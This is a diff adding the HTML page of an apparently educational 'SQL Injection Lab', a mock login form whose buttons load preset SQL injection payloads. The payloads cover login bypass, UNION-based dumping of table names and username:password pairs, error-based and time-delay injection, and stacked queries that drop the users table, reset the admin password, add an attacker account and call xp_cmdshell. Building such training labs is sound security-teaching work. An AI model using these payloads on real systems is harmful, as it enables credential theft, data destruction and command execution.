@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SQL INJECTION LAB</title>
+  <link href="https://fonts.googleapis.com/css2?family=Major+Mono+Display&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <!-- Binary Rain Background -->
+  <div class="binary-rain" id="binaryRain"></div>
+  
+  <!-- Main terminal container -->
+  <div class="cyber-terminal">
+    <div class="terminal-header">
+      <h1 class="terminal-title">SQL_INJECTION_LAB.EXE</h1>
+      <div class="terminal-controls">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+    </div>
+    
+    <div class="terminal-body" id="terminalOutput">
+      <div class="terminal-line">Initializing Cyber Security Lab...</div>
+      <div class="terminal-line">Loading SQL Injection Module...</div>
+      <div class="terminal-line">Establishing connection to test database...</div>
+      <div class="terminal-line" style="animation-delay: 0.3s">> Welcome to SQL Injection Lab</div>
+      <div class="terminal-line" style="animation-delay: 0.6s">> This is a safe environment to test SQL injection techniques</div>
+      <div class="terminal-line" style="animation-delay: 0.9s">> Try injecting malicious code in the login form below</div>
+      
+      <div class="injection-lab">
+        <h3>TEST LOGIN FORM</h3>
+        <div class="login-form">
+          <input type="text" id="username" class="form-input" placeholder="USERNAME">
+          <input type="password" id="password" class="form-input" placeholder="PASSWORD">
+          
+          <div class="attack-tabs">
+            <button class="tab-btn active" onclick="openTab('login-bypass')">Login Bypass</button>
+            <button class="tab-btn" onclick="openTab('data-extraction')">Data Extraction</button>
+            <button class="tab-btn" onclick="openTab('db-exploitation')">DB Exploitation</button>
+          </div>
+          
+          <div id="login-bypass" class="tab-content active">
+            <div class="attack-buttons">
+              <button class="attack-btn" onclick="loadAttack('1=1')">Basic Bypass</button>
+              <button class="attack-btn" onclick="loadAttack('\' OR \'1\'=\'1')">Always True</button>
+              <button class="attack-btn" onclick="loadAttack('admin\' --')">Comment Attack</button>
+              <button class="attack-btn" onclick="loadAttack('\' OR 1=1 --')">OR Condition</button>
+              <button class="attack-btn" onclick="loadAttack('admin\' OR \'1\'=\'1\' --')">Admin Bypass</button>
+            </div>
+          </div>
+          
+          <div id="data-extraction" class="tab-content">
+            <div class="attack-buttons">
+              <button class="attack-btn" onclick="loadAttack('\' UNION SELECT 1,2,3 --')">Basic Union</button>
+              <button class="attack-btn" onclick="loadAttack('\' UNION SELECT table_name,2,3 FROM information_schema.tables --')">Table Names</button>
+              <button class="attack-btn" onclick="loadAttack('\' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name=\'users\' --')">Column Names</button>
+              <button class="attack-btn" onclick="loadAttack('\' UNION SELECT CONCAT(username,\':\',password),2,3 FROM users --')">Data Dump</button>
+              <button class="attack-btn" onclick="loadAttack('\' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables)) --')">Error-Based</button>
+            </div>
+          </div>
+          
+          <div id="db-exploitation" class="tab-content">
+            <div class="attack-buttons">
+              <button class="attack-btn" onclick="loadAttack('\'; DROP TABLE users --')">Table Deletion</button>
+              <button class="attack-btn" onclick="loadAttack('\'; UPDATE users SET password=\'hacked\' WHERE username=\'admin\' --')">Data Manipulation</button>
+              <button class="attack-btn" onclick="loadAttack('\'; INSERT INTO users (username, password) VALUES (\'attacker\', \'pwned\') --')">Add User</button>
+              <button class="attack-btn" onclick="loadAttack('\'; EXEC xp_cmdshell(\'calc.exe\') --')">Command Execution</button>
+              <button class="attack-btn" onclick="loadAttack('\'; WAITFOR DELAY \'0:0:5\' --')">Time Delay</button>
+            </div>
+          </div>
+          
+          <button class="execute-btn" onclick="executeQuery()">EXECUTE QUERY</button>
+        </div>
+        
+        <div class="response-area" id="responseArea">
+          <div class="response-title">DATABASE RESPONSE</div>
+          <div id="responseContent">Awaiting query execution...</div>
+        </div>
+      </div>
+    </div>
+    
+    <div class="terminal-footer">
+      WARNING: FOR EDUCATIONAL PURPOSES ONLY | © 2025 CYBER SECURITY LAB
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
